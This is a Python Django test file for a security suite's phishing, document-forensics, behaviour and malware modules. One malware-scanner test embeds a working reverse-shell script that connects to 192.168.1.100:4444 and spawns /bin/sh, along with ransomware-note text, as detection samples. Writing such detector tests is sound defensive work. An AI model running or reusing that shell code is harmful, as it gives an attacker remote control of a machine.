"""
Quick Verification Tests — Cyber Secure AI Suite
Validates that all 4 modules are doing REAL processing, not faking results.
Run: venv/Scripts/python.exe api/manage.py test tests.test_verification -v2
"""
import io
import json
import os
import shutil
import tempfile
from decimal import Decimal
from unittest.mock import MagicMock

from django.conf import settings
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import TestCase, override_settings
from django.utils import timezone

from dashboard.models import (
    BehaviorEvent, DocumentAnalysis, MalwareScan,
    ModuleType, PhishingScan, RiskLevel, SecurityAlert,
)
from dashboard.forms import PhishingScanForm, MalwareScanForm, DocumentAnalysisForm


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 1: Phishing Module
# ══════════════════════════════════════════════════════════════════════════════

class PhishingRFModelTest(TestCase):
    """P1: Verify RF classifier trains on curated data and produces real scores."""

    def test_rf_model_trains_and_predicts(self):
        from dashboard.services.phishing import _ensure_rf_model
        model, scaler = _ensure_rf_model()
        self.assertIsNotNone(model, "RF model should not be None")
        self.assertIsNotNone(scaler, "Scaler should not be None")
        # Model should have 100 estimators (not some toy number)
        self.assertEqual(model.n_estimators, 100)

    def test_rf_model_scores_suspicious_url(self):
        from dashboard.services.phishing import _ensure_rf_model, _extract_url_features
        model, scaler = _ensure_rf_model()
        # Suspicious URL: IP-based, long, many params
        result = _extract_url_features("http://192.168.1.1/login?verify=true&user=admin&token=abc123", None)
        self.assertIsInstance(result, dict)
        self.assertIn('features', result)
        self.assertIn('score', result)
        self.assertGreater(len(result['features']), 10, "Should extract 18 URL features")
        print(f"  [Phishing URL Features] score={result['score']:.1f}, num_features={len(result['features'])}")

    def test_rf_model_differentiates_urls(self):
        """RF should give higher phishing probability to suspicious URLs."""
        from dashboard.services.phishing import _ensure_rf_model, _extract_url_features, _rf_url_score
        model, scaler = _ensure_rf_model()

        sus_result = _extract_url_features("http://192.168.1.1/login/verify-account.php?user=admin&token=abc", None)
        safe_result = _extract_url_features("https://www.google.com/search?q=test", None)

        sus_rf = _rf_url_score(sus_result['features'])
        safe_rf = _rf_url_score(safe_result['features'])

        self.assertGreater(sus_rf, safe_rf,
                           f"Suspicious URL RF score ({sus_rf:.1f}) should be higher than safe ({safe_rf:.1f})")
        print(f"  [Phishing RF] suspicious={sus_rf:.1f}, safe={safe_rf:.1f}")


class PhishingAnalyseTest(TestCase):
    """Test full phishing analyse_scan pipeline."""

    def test_url_scan_returns_real_scores(self):
        from dashboard.services.phishing import analyse_scan
        result = analyse_scan({
            'input_type': PhishingScan.InputType.URL,
            'target_url': 'http://192.168.1.1/login?verify=true',
            'raw_content': '',
            'headers': {},
            'domain_age_days': None,
        })
        self.assertIn('risk_score', result)
        self.assertIn('metadata', result)
        self.assertIsInstance(result['risk_score'], (int, float))
        # URL features + RF should produce a non-zero URL score
        scores = result['metadata'].get('scores', {})
        self.assertIn('url_features', scores)
        self.assertIn('rf_classifier', scores)
        self.assertGreater(scores['url_features'], 0, "URL features score should be > 0 for IP-based URL")
        print(f"  [Phishing URL] risk_score={result['risk_score']:.1f}, "
              f"url_features={scores.get('url_features', 0):.1f}, "
              f"rf_classifier={scores.get('rf_classifier', 0):.1f}")

    def test_message_scan_nlp_works(self):
        from dashboard.services.phishing import analyse_scan
        result = analyse_scan({
            'input_type': PhishingScan.InputType.MESSAGE,
            'target_url': '',
            'raw_content': 'URGENT: Your account has been compromised! Click here immediately to verify your identity or your account will be suspended permanently.',
            'headers': {},
            'domain_age_days': None,
        })
        scores = result['metadata'].get('scores', {})
        # NLP layer should fire on urgent phishing-like text
        nlp_score = scores.get('nlp_content', 0)
        self.assertGreater(nlp_score, 0, "NLP should score phishing text > 0")
        print(f"  [Phishing MSG] risk_score={result['risk_score']:.1f}, nlp_content={nlp_score:.1f}")


class PhishingFormTest(TestCase):
    """P5: Verify CharField accepts malformed URLs."""

    def test_malformed_url_accepted(self):
        form = PhishingScanForm(data={
            'input_type': 'url',
            'target_url': 'http://192.168.1.1/login?verify=true',
        })
        self.assertTrue(form.is_valid(), f"Form errors: {form.errors}")

    def test_non_http_url_accepted(self):
        form = PhishingScanForm(data={
            'input_type': 'url',
            'target_url': 'ftp://evil.tk/payload.exe',
        })
        self.assertTrue(form.is_valid(), f"Form errors: {form.errors}")


class PhishingHeaderParsingTest(TestCase):
    """P4: Verify RFC 2822 header parsing."""

    def test_rfc2822_headers_parsed(self):
        raw_headers = (
            "From: sender@example.com\n"
            "To: victim@example.com\n"
            "Subject: Urgent security\n"
            "  update required\n"
            "X-Mailer: Evil Mailer 1.0\n"
            "Authentication-Results: spf=fail dkim=none"
        )
        form = PhishingScanForm(data={
            'input_type': 'headers',
            'raw_content': 'Suspicious email content here',
            'headers': raw_headers,
        })
        self.assertTrue(form.is_valid(), f"Form errors: {form.errors}")
        parsed = form.cleaned_data['headers']
        self.assertIsInstance(parsed, dict)
        self.assertIn('From', parsed)
        self.assertIn('Authentication-Results', parsed)
        # Folded header should be joined
        self.assertIn('update required', parsed.get('Subject', ''))
        print(f"  [Headers] Parsed {len(parsed)} header fields: {list(parsed.keys())}")

    def test_json_headers_parsed(self):
        form = PhishingScanForm(data={
            'input_type': 'headers',
            'raw_content': 'test',
            'headers': '{"From": "test@example.com", "SPF": "pass"}',
        })
        self.assertTrue(form.is_valid(), f"Form errors: {form.errors}")
        self.assertIsInstance(form.cleaned_data['headers'], dict)
        self.assertEqual(form.cleaned_data['headers']['SPF'], 'pass')


class WhoisLookupTest(TestCase):
    """P3: Verify WHOIS helper exists and handles errors gracefully."""

    def test_whois_function_exists(self):
        from dashboard.services.ml_utils import get_domain_age_days
        # Should not crash on invalid domain
        result = get_domain_age_days("thisdomain-does-not-exist-12345.xyz")
        # May return None (lookup fails) — that's fine, just shouldn't crash
        self.assertIsInstance(result, (int, type(None)))

    def test_whois_known_domain(self):
        from dashboard.services.ml_utils import get_domain_age_days
        result = get_domain_age_days("google.com")
        if result is not None:
            self.assertGreater(result, 5000, "google.com should be >5000 days old")
            print(f"  [WHOIS] google.com age: {result} days")
        else:
            print("  [WHOIS] Lookup returned None (network issue?) — graceful degradation OK")


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 2: Document Forensics Module
# ══════════════════════════════════════════════════════════════════════════════

class DocumentELATest(TestCase):
    """D1/D2: Verify ELA and CNN produce real scores on images."""

    def test_ela_on_jpeg(self):
        """ELA should produce a non-zero score on a real JPEG image."""
        from PIL import Image
        # Create a simple test image
        img = Image.new('RGB', (200, 200), color='red')
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=85)
        buf.seek(0)

        file = SimpleUploadedFile("test.jpg", buf.read(), content_type="image/jpeg")
        from dashboard.services.document import analyse_document
        result = analyse_document(file, run_ocr=False, run_semantic=False)

        self.assertIn('ela_score', result)
        self.assertIn('sha256', result)
        self.assertEqual(len(result['sha256']), 64)
        print(f"  [Doc ELA] ela={result['ela_score']:.1f}, verdict={result.get('verdict')}")


class DocumentPDFTest(TestCase):
    """D3: Verify PDF text extraction works with PyMuPDF."""

    def test_pdf_extraction_available(self):
        import fitz
        self.assertTrue(hasattr(fitz, 'open'), "PyMuPDF should be importable")

    def test_pdf_text_extraction(self):
        from dashboard.services.document import _extract_pdf_text
        # Create a minimal PDF in memory via PyMuPDF
        import fitz
        doc = fitz.open()
        page = doc.new_page()
        page.insert_text((72, 72), "This is a test PDF document for forensic analysis.")
        pdf_bytes = doc.tobytes()
        doc.close()

        file = SimpleUploadedFile("test.pdf", pdf_bytes, content_type="application/pdf")
        result = _extract_pdf_text(file)
        self.assertTrue(result['available'], "PDF extraction should be available")
        self.assertGreater(len(result['text']), 10, "Should extract text from PDF")
        self.assertEqual(result['page_count'], 1)
        print(f"  [Doc PDF] Extracted {len(result['text'])} chars, pages={result['page_count']}")


class DocumentDOCXTest(TestCase):
    """D4: Verify DOCX text extraction works."""

    def test_docx_extraction(self):
        from dashboard.services.document import _extract_docx_text
        from docx import Document
        # Create a minimal DOCX in memory
        doc = Document()
        doc.add_paragraph("This is a test document for forensic analysis.")
        doc.add_paragraph("It contains multiple paragraphs to verify extraction.")
        buf = io.BytesIO()
        doc.save(buf)
        buf.seek(0)

        file = SimpleUploadedFile("test.docx", buf.read(),
                                  content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document")
        result = _extract_docx_text(file)
        self.assertTrue(result['available'], "DOCX extraction should be available")
        self.assertIn("forensic analysis", result['text'])
        print(f"  [Doc DOCX] Extracted {len(result['text'])} chars, findings={result['findings']}")


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 3: Behavioral Analytics Module
# ══════════════════════════════════════════════════════════════════════════════

class BehaviorEventTypeMapTest(TestCase):
    """B2: Verify OTHER is in EVENT_TYPE_MAP."""

    def test_other_event_type_mapped(self):
        from dashboard.services.behavior import EVENT_TYPE_MAP
        self.assertIn(BehaviorEvent.EventType.OTHER, EVENT_TYPE_MAP)
        self.assertEqual(EVENT_TYPE_MAP[BehaviorEvent.EventType.OTHER], 5)
        print(f"  [Behavior] EVENT_TYPE_MAP has {len(EVENT_TYPE_MAP)} entries: {dict(EVENT_TYPE_MAP)}")

    def test_all_event_types_mapped(self):
        from dashboard.services.behavior import EVENT_TYPE_MAP
        for et in BehaviorEvent.EventType:
            self.assertIn(et, EVENT_TYPE_MAP,
                          f"EventType.{et.label} missing from EVENT_TYPE_MAP")


class BehaviorFeatureVectorTest(TestCase):
    """Verify feature vector builds correctly."""

    def test_feature_vector_length(self):
        from dashboard.services.behavior import _build_feature_vector
        event = BehaviorEvent(
            actor_identifier="test@example.com",
            event_type=BehaviorEvent.EventType.OTHER,
            occurred_at=timezone.now(),
            location="New York",
            device="Chrome/Windows",
        )
        features = _build_feature_vector(event, [], 0)
        self.assertEqual(len(features), 10, "Feature vector should have 10 elements")
        # Check event_type_encoded is 5 (OTHER)
        self.assertEqual(features[6], 5.0, "OTHER should encode as 5")
        print(f"  [Behavior] Feature vector: {features}")


class BehaviorDetectTest(TestCase):
    """Verify detect_and_update processes real events."""

    def test_cold_start_rule_based(self):
        """With <15 events, should use rule-based scoring."""
        event = BehaviorEvent.objects.create(
            actor_identifier="testuser@example.com",
            event_type=BehaviorEvent.EventType.PRIVILEGE_CHANGE,
            occurred_at=timezone.now().replace(hour=3),  # off-hours
            location="Unknown Location",
            device="Unknown Device",
        )
        from dashboard.services.behavior import detect_and_update
        result = detect_and_update(event)
        self.assertGreater(float(result.risk_score), 0,
                           "Privilege change at 3AM should have non-zero risk")
        self.assertEqual(result.metadata.get('detection_mode'), 'rule',
                         "Should use rule-based mode with <15 events")
        print(f"  [Behavior] risk={result.risk_score}, anomalous={result.is_anomalous}, "
              f"mode={result.metadata.get('detection_mode')}, "
              f"reasons={result.anomaly_reasons}")


class BehaviorAlertTest(TestCase):
    """B1: Verify behavior alerts are generated."""

    def test_alert_from_anomalous_event(self):
        from dashboard.services import alerts as alert_service
        event = BehaviorEvent.objects.create(
            actor_identifier="attacker@example.com",
            event_type=BehaviorEvent.EventType.PRIVILEGE_CHANGE,
            occurred_at=timezone.now().replace(hour=2),
            location="Suspicious VPN",
            device="Unknown",
            risk_score=Decimal('75'),
            is_anomalous=True,
            anomaly_reasons=["Off-hours access", "Unknown device", "Privilege escalation"],
            metadata={'detection_mode': 'rule', 'history_count': 0},
        )
        alert = alert_service.alert_from_behavior(event)
        self.assertIsNotNone(alert, "Should create alert for anomalous event")
        self.assertEqual(alert.module, ModuleType.BEHAVIOR)
        self.assertIn(alert.severity, [RiskLevel.HIGH, RiskLevel.CRITICAL])
        print(f"  [Behavior Alert] title='{alert.title}', severity={alert.severity}, "
              f"module={alert.module}")

    def test_no_alert_for_normal_event(self):
        from dashboard.services import alerts as alert_service
        event = BehaviorEvent.objects.create(
            actor_identifier="normaluser@example.com",
            event_type=BehaviorEvent.EventType.LOGIN,
            occurred_at=timezone.now().replace(hour=10),
            location="Office",
            device="Laptop",
            risk_score=Decimal('10'),
            is_anomalous=False,
            anomaly_reasons=[],
            metadata={'detection_mode': 'rule', 'history_count': 0},
        )
        alert = alert_service.alert_from_behavior(event)
        self.assertIsNone(alert, "Should NOT create alert for normal event")


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 4: Malware Guard Module
# ══════════════════════════════════════════════════════════════════════════════

class MalwareGBModelTest(TestCase):
    """M1: Verify GB classifier trains on curated data."""

    def test_gb_model_trains(self):
        from dashboard.services.malware import _ensure_malware_ml
        result = _ensure_malware_ml()
        self.assertIsNotNone(result, "GB model tuple should not be None")
        model, scaler = result
        self.assertIsNotNone(model, "GB model should not be None")
        self.assertIsNotNone(scaler, "Scaler should not be None")
        print(f"  [Malware GB] n_estimators={model.n_estimators}, "
              f"features={model.n_features_in_}")


class MalwareEntropyTest(TestCase):
    """Verify block-level entropy analysis is real."""

    def test_entropy_on_random_data(self):
        from dashboard.services.malware import _block_entropy_analysis
        # High entropy data (like encrypted/packed malware)
        import os
        random_data = os.urandom(4096)
        result = _block_entropy_analysis(random_data)
        self.assertIn('mean_entropy', result)
        self.assertGreater(result['mean_entropy'], 7.0,
                           "Random data should have high entropy (>7.0)")
        print(f"  [Malware Entropy] random_data: mean={result['mean_entropy']:.2f}, "
              f"variance={result.get('entropy_variance', 0):.4f}")

    def test_entropy_on_text_data(self):
        from dashboard.services.malware import _block_entropy_analysis
        # Low entropy data (plain text)
        text_data = b"Hello world! " * 500
        result = _block_entropy_analysis(text_data)
        self.assertLess(result['mean_entropy'], 4.0,
                        "Plain text should have low entropy (<4.0)")
        print(f"  [Malware Entropy] text_data: mean={result['mean_entropy']:.2f}")


class MalwareSignatureTest(TestCase):
    """Verify signature scanner catches real patterns."""

    def test_signature_detects_ransomware_pattern(self):
        from dashboard.services.malware import _scan_signatures
        # Content with ransomware-like strings
        content = b"""
        Your files have been encrypted!
        Send 0.5 BTC to wallet address bc1q...
        All your documents are now locked.
        Pay the ransom within 48 hours or files will be deleted permanently.
        """
        result = _scan_signatures(content)
        self.assertIsInstance(result, dict)
        self.assertGreater(result['score'], 0, "Should detect ransomware-like patterns")
        flat = result['flat_hits']
        self.assertGreater(len(flat), 0, "Should have signature hits")
        print(f"  [Malware Sigs] score={result['score']:.1f}, "
              f"categories={list(result['hits_by_category'].keys())}, "
              f"hits={flat[:3]}")

    def test_signature_clean_file(self):
        from dashboard.services.malware import _scan_signatures
        # Use truly benign content that won't trigger any regex
        content = b"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor."
        result = _scan_signatures(content)
        self.assertEqual(len(result['flat_hits']), 0,
                         f"Clean file should have 0 hits, got: {result['flat_hits']}")


class MalwareQuarantineTest(TestCase):
    """M2: Verify real file quarantine."""

    def setUp(self):
        self.temp_quarantine = tempfile.mkdtemp(prefix="test_quarantine_")

    def tearDown(self):
        shutil.rmtree(self.temp_quarantine, ignore_errors=True)

    @override_settings()
    def test_quarantine_creates_real_file(self):
        settings.QUARANTINE_ROOT = self.temp_quarantine
        from dashboard.services.malware import _quarantine_file
        import hashlib

        content = b"simulated malware payload"
        sha = hashlib.sha256(content).hexdigest()
        file = SimpleUploadedFile("evil.exe", content)

        path = _quarantine_file(file, sha, "evil.exe")
        self.assertIn(sha, path, "Quarantine path should contain SHA256")
        self.assertTrue(os.path.exists(path), f"Quarantine file should exist at {path}")

        # Check companion metadata file
        meta_path = path + ".meta.json"
        self.assertTrue(os.path.exists(meta_path), "Meta JSON should exist")
        with open(meta_path) as f:
            meta = json.load(f)
        self.assertEqual(meta['original_name'], "evil.exe")
        self.assertEqual(meta['sha256'], sha)
        print(f"  [Malware Quarantine] File at: {path}")
        print(f"  [Malware Quarantine] Meta: {meta}")


class MalwareFullPipelineTest(TestCase):
    """Verify full malware analysis pipeline."""

    def test_analyse_clean_text_file(self):
        from dashboard.services.malware import analyse_file
        content = b"This is a perfectly normal log file.\nLine 2 of the log.\n" * 10
        file = SimpleUploadedFile("access.log", content, content_type="text/plain")
        result = analyse_file(file, enforce_policy=False)
        self.assertIn('risk_score', result)
        self.assertIn('sha256', result)
        self.assertIn('entropy', result)
        self.assertEqual(len(result['sha256']), 64)
        print(f"  [Malware Clean] risk={result['risk_score']:.1f}, "
              f"entropy={result['entropy']:.2f}, verdict={result['verdict']}")

    def test_analyse_suspicious_script(self):
        from dashboard.services.malware import analyse_file
        # Python script with suspicious patterns
        content = b"""
import socket
import subprocess
import os

def connect_back():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.100", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    subprocess.call(["/bin/sh", "-i"])
    exec(base64.b64decode("aW1wb3J0IG9z"))

connect_back()
"""
        file = SimpleUploadedFile("backdoor.py", content, content_type="text/x-python")
        result = analyse_file(file, enforce_policy=False)
        self.assertGreater(result['risk_score'], 0,
                           "Backdoor script should have non-zero risk score")
        # Check that at least some detection layers fired
        has_sigs = len(result.get('signature_hits', [])) > 0
        has_heuristics = len(result.get('heuristic_findings', [])) > 0
        self.assertTrue(has_sigs or has_heuristics,
                        "Should detect suspicious signatures or heuristics")
        print(f"  [Malware Script] risk={result['risk_score']:.1f}, "
              f"sigs={len(result.get('signature_hits', []))}, "
              f"heuristics={len(result.get('heuristic_findings', []))}, "
              f"verdict={result['verdict']}")


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 5: Cross-Module Integration
# ══════════════════════════════════════════════════════════════════════════════

class ModelFieldTest(TestCase):
    """P5/Phase 3: Verify PhishingScan.target_url is CharField."""

    def test_target_url_is_charfield(self):
        field = PhishingScan._meta.get_field('target_url')
        self.assertEqual(field.__class__.__name__, 'CharField',
                         "target_url should be CharField, not URLField")
        self.assertEqual(field.max_length, 2048)
        print(f"  [Model] PhishingScan.target_url: {field.__class__.__name__}(max_length={field.max_length})")


class QuarantineSettingTest(TestCase):
    """Phase 2: Verify QUARANTINE_ROOT is configured."""

    def test_quarantine_root_exists(self):
        self.assertTrue(hasattr(settings, 'QUARANTINE_ROOT'),
                        "settings.QUARANTINE_ROOT should be defined")
        print(f"  [Settings] QUARANTINE_ROOT = {settings.QUARANTINE_ROOT}")
